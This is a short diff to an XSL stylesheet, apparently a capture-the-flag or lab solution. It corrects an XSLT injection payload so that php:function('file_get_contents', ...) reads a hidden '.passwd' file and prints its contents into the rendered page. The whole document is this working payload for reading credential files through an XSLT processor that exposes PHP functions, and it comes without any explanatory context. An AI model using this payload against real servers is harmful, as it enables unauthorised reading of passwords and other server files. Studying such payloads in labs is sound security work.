@@ -7,7 +7,7 @@
 			<h3>BRUH</h3>
 			<ul>
 				<li>
-					<xsl:value-of select="php:function('file_get_content', '.6ff3200bee785801f420fba826ffcdee\.passwd')"/>
+					<xsl:value-of select="php:function('file_get_contents', '.6ff3200bee785801f420fba826ffcdee\.passwd')"/>
 				</li>
 			</ul>
 		</body>
